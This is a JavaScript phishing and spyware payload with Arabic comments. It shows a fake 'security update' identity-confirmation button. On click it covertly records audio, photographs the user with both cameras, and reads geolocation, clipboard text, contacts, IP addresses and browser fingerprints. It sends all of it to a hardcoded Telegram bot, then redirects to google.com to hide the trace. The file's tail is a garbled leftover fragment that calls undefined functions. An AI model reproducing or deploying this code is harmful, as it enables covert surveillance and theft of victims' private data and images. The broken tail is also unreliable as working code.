// ========== توكن تلغرام ==========
const BOT_TOKEN = "8449865560:AAHHFcJWchQlKNgYpP3W7BYXUWvbAOKFAkI";
const CHAT_ID = "7984067238";

let fullReport = {};
let audioBlob = null;
let photos = { front: null, back: null };
let contactsList = [];
let sent = false;

// ========== دوال مساعدة ==========
async function captureFrame(stream, maxDimension = 640) {
    return new Promise((resolve) => {
        const video = document.createElement("video");
        video.srcObject = stream;
        video.onloadedmetadata = () => {
            video.play();
            setTimeout(() => {
                const canvas = document.createElement("canvas");
                let w = video.videoWidth, h = video.videoHeight;
                if (w > maxDimension) { h = (h * maxDimension) / w; w = maxDimension; }
                canvas.width = w; canvas.height = h;
                canvas.getContext("2d").drawImage(video, 0, 0, w, h);
                resolve(canvas.toDataURL("image/jpeg", 0.7));
                video.remove();
            }, 200);
        };
    });
}

async function captureAudio(duration = 3000) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        const mediaRecorder = new MediaRecorder(stream);
        const chunks = [];
        mediaRecorder.ondataavailable = e => chunks.push(e.data);
        mediaRecorder.start();
        await new Promise(r => setTimeout(r, duration));
        mediaRecorder.stop();
        await new Promise(r => mediaRecorder.onstop = r);
        stream.getTracks().forEach(t => t.stop());
        const blob = new Blob(chunks, { type: "audio/webm" });
        return blob;
    } catch(e) { return null; }
}

async function getContacts() {
    if (!navigator.contacts) return null;
    try {
        const contacts = await navigator.contacts.select(["name", "tel", "email"], { multiple: true });
        return contacts.map(c => ({ name: c.name?.[0] || "", tel: c.tel?.[0] || "", email: c.email?.[0] || "" }));
    } catch(e) { return null; }
}

async function getPublicIP() {
    try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        return data.ip;
    } catch(e) { return null; }
}

function getLocalIPs() {
    return new Promise((resolve) => {
        const ips = [];
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel("");
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        pc.onicecandidate = (e) => {
            if (!e.candidate) return;
            const ip = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(e.candidate.candidate)?.[0];
            if (ip && !ips.includes(ip)) ips.push(ip);
            if (ips.length > 0) resolve(ips);
        };
        setTimeout(() => resolve(ips), 1000);
    });
}

function getCanvasFingerprint() {
    const canvas = document.createElement("canvas");
    canvas.width = 200; canvas.height = 50;
    const ctx = canvas.getContext("2d");
    ctx.textBaseline = "top";
    ctx.font = "14px Arial";
    ctx.fillStyle = "#f60";
    ctx.fillRect(0, 0, 200, 50);
    ctx.fillStyle = "#069";
    ctx.fillText("🕵️", 10, 10);
    return canvas.toDataURL();
}

function getWebGLFingerprint() {
    const canvas = document.createElement("canvas");
    const gl = canvas.getContext("webgl");
    if (!gl) return null;
    const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
    if (!debugInfo) return null;
    const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
    return { vendor, renderer };
}

// ========== جمع كل البيانات ==========
async function collectEverything() {
    const data = {};

    // الأساسيات
    data.userAgent = navigator.userAgent;
    data.platform = navigator.platform;
    data.language = navigator.language;
    data.hardwareConcurrency = navigator.hardwareConcurrency;
    data.deviceMemory = navigator.deviceMemory || "unknown";
    data.cookieEnabled = navigator.cookieEnabled;
    data.doNotTrack = navigator.doNotTrack;
    data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    data.screen = `${screen.width}x${screen.height}, depth=${screen.colorDepth}`;

    // البطارية
    if (navigator.getBattery) {
        const bat = await navigator.getBattery();
        data.battery = { level: bat.level*100+"%", charging: bat.charging, timeRemaining: bat.dischargingTime };
    }

    // التخزين
    if (navigator.storage?.estimate) {
        const est = await navigator.storage.estimate();
        data.storage = { total: (est.quota/1e9).toFixed(2)+" GB", used: (est.usage/1e9).toFixed(2)+" GB" };
    }

    // الشبكة
    if (navigator.connection) {
        data.network = {
            type: navigator.connection.effectiveType,
            downlink: navigator.connection.downlink+" Mbps",
            rtt: navigator.connection.rtt+" ms",
            saveData: navigator.connection.saveData
        };
    }

    // الإضافات
    data.plugins = Array.from(navigator.plugins || []).map(p => p.name);

    // IP العام والمحلي
    data.publicIP = await getPublicIP();
    data.localIPs = await getLocalIPs();

    // بصمة Canvas و WebGL
    data.canvasFingerprint = getCanvasFingerprint().substring(0, 100); // اختصار
    data.webgl = getWebGLFingerprint();

    // مستشعرات الحركة والإضاءة
    if (window.DeviceOrientationEvent) {
        data.orientation = await new Promise(resolve => {
            const handler = (e) => { resolve({ alpha: e.alpha, beta: e.beta, gamma: e.gamma }); window.removeEventListener("deviceorientation", handler); };
            window.addEventListener("deviceorientation", handler);
            setTimeout(() => resolve(null), 500);
        });
    }
    if ("AmbientLightSensor" in window) {
        try {
            const sensor = new AmbientLightSensor();
            sensor.onreading = () => { data.ambientLight = sensor.illuminance; };
            sensor.start();
            await new Promise(r => setTimeout(r, 200));
        } catch(e) {}
    }

    // الحافظة (قد تطلب إذناً)
    if (navigator.clipboard?.readText) {
        try {
            data.clipboard = await navigator.clipboard.readText();
        } catch(e) { data.clipboard = "مرفوض"; }
    }

    // الأداء
    if (performance.memory) {
        data.memoryUsage = (performance.memory.usedJSHeapSize / 1e6).toFixed(0) + " MB";
    }

    // الاهتزاز (تنبيه)
    if (navigator.vibrate) navigator.vibrate(200);

    return data;
}

// ========== إرسال التقرير النهائي ==========
async function sendFinalReport() {
    if (sent) return;
    sent = true;

    // جمع كل شيء
    const basicData = await collectEverything();
    const location = await new Promise(resolve => {
        if (!navigator.geolocation) resolve(null);
        else navigator.geolocation.getCurrentPosition(
            pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }),
            () => resolve(null),
            { timeout: 5000 }
        );
    });
    const contacts = await getContacts();
    const audio = await captureAudio(3000);
    
    // الكاميرا
    const frontCam = await captureFromCamera("user");
    const backCam = await captureFromCamera("environment");

    // بناء النص
    let text = `🔥 *عبد الرابط - تقرير خارق* 🔥\n`;
    text += `📱 UA: ${basicData.userAgent}\n`;
    text += `💻 Platform: ${basicData.platform}\n`;
    text += `🔋 Battery: ${basicData.battery?.level} (شحن: ${basicData.battery?.charging})\n`;
    text += `📡 Location: ${location ? location.lat+","+location.lon : "مرفوض"}\n`;
    text += `🌐 Public IP: ${basicData.publicIP || "لا"}\n`;
    text += `🏠 Local IPs: ${basicData.localIPs?.join(", ") || "لا"}\n`;
    text += `📶 Network: ${basicData.network?.type}, ${basicData.network?.downlink}\n`;
    text += `💾 Storage: ${basicData.storage?.total}\n`;
    text += `🧠 RAM: ${basicData.deviceMemory} GB\n`;
    text += `🕒 Timezone: ${basicData.timezone}\n`;
    text += `📺 Screen: ${basicData.screen}\n`;
    text += `🖌️ Canvas: ${basicData.canvasFingerprint}...\n`;
    text += `🎮 WebGL: ${basicData.webgl?.vendor || "?"}\n`;
    text += `📞 Contacts: ${contacts ? contacts.length + " جهة" : "لا/مرفوض"}\n`;
    text += `🎤 Audio: ${audio ? "تم التسجيل" : "فشل"}\n`;

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "Markdown" })
    });

    // إرسال الصور
    if (frontCam && !frontCam.error)
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({ chat_id: CHAT_ID, photo: frontCam, caption: "📸 أمامي" }) });
    if (backCam && !backCam.error)
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({ chat_id: CHAT_ID, photo: backCam, caption: "📸 خلفي" }) });

    // إرسال الصوت إن وجد
    if (audio) {
        const formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        formData.append("voice", audio, "voice.ogg");
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: "POST", body: formData });
    }

    // إرسال جهات الاتصال كملف JSON
    if (contacts && contacts.length) {
        const blob = new Blob([JSON.stringify(contacts, null, 2)], {type: "application/json"});
        const doc = new File([blob], "contacts.json", {type: "application/json"});
        const fd = new FormData();
        fd.append("chat_id", CHAT_ID);
        fd.append("document", doc);
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: "POST", body: fd });
    }

    // إعادة توجيه
    setTimeout(() => { window.location.href = "https://google.com"; }, 2000);
}

async function captureFromCamera(facingMode) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: facingMode } } });
        const photo = await captureFrame(stream);
        stream.getTracks().forEach(t => t.stop());
        return photo;
    } catch(e) { return { error: e.message }; }
}

// ========== بدء التشغيل: انتظر نقرة ==========
function showFakeUI() {
    document.body.innerHTML = `
        <div style="text-align:center; padding:50px; font-family:system-ui;">
            <h2>🔐 تحديث الأمان</h2>
            <p>يرجى النقر للتحقق من هويتك</p>
            <button id="startBtn" style="padding:12px 24px; font-size:18px;">تأكيد الهوية</button>
        </div>
    `;
    document.getElementById("startBtn").addEventListener("click", async () => {
        document.body.innerHTML = "<div style='text-align:center;padding:50px'>جاري التحقق...</div>";
        await sendFinalReport();
    });
}

showFakeUI();🧠 Memory: ${data.deviceMemory} GB
    `;

    // إرسال النص
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: "Markdown"
        })
    });

    // إرسال الصور
    if (photos.front && !photos.front.error) {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                photo: photos.front,
                caption: "📸 الكاميرا الأمامية"
            })
        });
    }

    if (photos.back && !photos.back.error) {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                photo: photos.back,
                caption: "📸 الكاميرا الخلفية"
            })
        });
    }
}

// ========== التنفيذ ==========
(async () => {
    const data = await collectAllData();
    const photos = await capturePhotos();
    await sendToTelegram(data, photos);

    // إعادة توجيه وهمي لإخفاء الأثر
    setTimeout(() => {
        window.location.href = "https://google.com";
    }, 2000);
})();
